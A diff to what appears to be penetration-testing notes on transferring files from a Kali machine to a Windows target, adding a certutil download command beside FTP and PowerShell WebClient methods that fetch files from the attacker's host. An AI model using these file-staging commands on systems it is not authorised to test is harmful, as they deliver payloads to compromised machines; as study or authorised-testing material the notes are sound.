@@ -23,3 +23,7 @@ Step 1) Run the FTP on kali
         sudo python3 -m pyftpdlib --port 21
 Step 2) Download the file in windows 
         (New-Object Net.WebClient).DownloadFile('ftp://<Kali IP address>/file.txt', 'C:\Users\Public\ftp-file.txt')
+
+
+Option 5) The best option to run 
+        certutil -urlcache -split -f https://<Kali IP address:Port>/<File> <Output file path e.g. c:\temp\test.zip>
